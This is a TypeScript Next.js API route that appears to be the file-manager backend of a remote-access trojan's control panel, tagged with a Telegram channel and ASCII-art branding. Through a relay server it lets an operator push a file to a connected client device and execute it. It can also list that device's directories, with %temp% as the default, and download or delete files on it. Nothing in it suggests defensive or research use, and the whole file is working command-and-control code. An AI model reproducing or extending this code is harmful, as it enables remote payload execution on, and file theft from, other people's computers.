// t.me/SentinelLinks

import { NextResponse } from "next/server"

const WS_SERVER_URL = process.env.GROB_WS_SERVER_URL || "http://localhost:8765"

// t.me/SentinelLinks
export async function POST(request: Request) {
  try {
    const contentType = request.headers.get("content-type") || ""
    const clientId = request.headers.get("x-client-id")

    if (contentType.includes("multipart/form-data")) {
      if (!clientId) {
        return NextResponse.json({ success: false, error: "Client ID required" }, { status: 400 })
      }

      const formData = await request.formData()
      const file = formData.get("file") as File

      if (!file) {
        return NextResponse.json({ success: false, error: "No file provided" }, { status: 400 })
      }

      const arrayBuffer = await file.arrayBuffer()
      const base64 = Buffer.from(arrayBuffer).toString("base64")

      try {
        const controller = new AbortController()
        const timeoutId = setTimeout(() => controller.abort(), 5000)

        const response = await fetch(`${WS_SERVER_URL}/files`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            clientId,
            action: "upload",
            fileName: file.name,
            fileData: base64,
            fileSize: file.size,
          }),
          signal: controller.signal,
        })

        clearTimeout(timeoutId)

        if (!response.ok) {
          throw new Error("Failed to send file to client")
        }

        return NextResponse.json({ success: true, message: "File uploaded to client" })
      } catch (fetchError) {
        console.error("WS Server connection error:", fetchError)
        return NextResponse.json(
          {
            success: false,
            error: "Не удалось подключиться к клиенту. Проверьте подключение устройства.",
          },
          { status: 503 },
        )
      }
    }

    const data = await request.json()
    const jsonClientId = data.clientId || clientId

    if (!jsonClientId) {
      return NextResponse.json({ success: false, error: "Client ID required" }, { status: 400 })
    }

    const fetchWithTimeout = async (url: string, options: RequestInit) => {
      const controller = new AbortController()
      const timeoutId = setTimeout(() => controller.abort(), 5000)

      try {
        const response = await fetch(url, {
          ...options,
          signal: controller.signal,
        })
        clearTimeout(timeoutId)
        return response
      } catch (error) {
        clearTimeout(timeoutId)
        if (error instanceof Error && error.name === "AbortError") {
          throw new Error("Timeout: клиент не отвечает")
        }
        throw error
      }
    }

// t.me/SentinelLinks
    if (data.action === "upload") {
      try {
        const response = await fetchWithTimeout(`${WS_SERVER_URL}/files`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            clientId: jsonClientId,
            action: "upload",
            fileName: data.fileName,
            fileData: data.fileData,
            fileSize: data.fileSize,
          }),
        })

        if (!response.ok) {
          throw new Error("Failed to send file to client")
        }

        return NextResponse.json({ success: true, message: "File uploaded to client" })
      } catch (error) {
        return NextResponse.json(
          {
            success: false,
            error: error instanceof Error ? error.message : "Ошибка загрузки файла",
          },
          { status: 503 },
        )
      }
    }

    if (data.action === "execute") {
      try {
        const response = await fetchWithTimeout(`${WS_SERVER_URL}/files`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            clientId: jsonClientId,
            action: "execute",
            fileName: data.fileName,
          }),
        })

        if (!response.ok) {
          throw new Error("Failed to execute file on client")
        }

        return NextResponse.json({ success: true, message: "File execution started" })
      } catch (error) {
        return NextResponse.json(
          {
            success: false,
            error: error instanceof Error ? error.message : "Ошибка запуска файла",
          },
          { status: 503 },
        )
      }
    }

    if (data.action === "list") {
      try {
        const response = await fetchWithTimeout(`${WS_SERVER_URL}/files`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            clientId: jsonClientId,
            action: "list",
            path: data.path || "%temp%",
          }),
        })

        if (!response.ok) {
          throw new Error("Клиент не отвечает")
        }

        const result = await response.json()
        return NextResponse.json({ success: true, files: result.files || [] })
      } catch (error) {
        return NextResponse.json({
          success: false,
          files: [],
          error:
            error instanceof Error
              ? error.message
              : "Не удалось получить список файлов. Клиент не подключен или не отвечает.",
        })
      }
    }

    if (data.action === "download") {
      try {
        const response = await fetchWithTimeout(`${WS_SERVER_URL}/files`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            clientId: jsonClientId,
            action: "download",
            path: data.path,
          }),
        })

        if (!response.ok) {
          throw new Error("Failed to download file")
        }

        const result = await response.json()
        return NextResponse.json({ success: true, fileData: result.fileData, fileName: result.fileName })
      } catch (error) {
        return NextResponse.json(
          {
            success: false,
            error: error instanceof Error ? error.message : "Ошибка скачивания файла",
          },
          { status: 503 },
        )
      }
    }

    if (data.action === "delete") {
      try {
        const response = await fetchWithTimeout(`${WS_SERVER_URL}/files`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            clientId: jsonClientId,
            action: "delete",
            path: data.path,
          }),
        })

        if (!response.ok) {
          throw new Error("Failed to delete file")
        }

// t.me/SentinelLinks
        return NextResponse.json({ success: true, message: "File deleted" })
      } catch (error) {
        return NextResponse.json(
          {
            success: false,
            error: error instanceof Error ? error.message : "Ошибка удаления файла",
          },
          { status: 503 },
        )
      }
    }

    return NextResponse.json({ success: false, error: "Unknown action" }, { status: 400 })
  } catch (error) {
    console.error("Files API error:", error)
    return NextResponse.json(
      {
        success: false,
        error: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
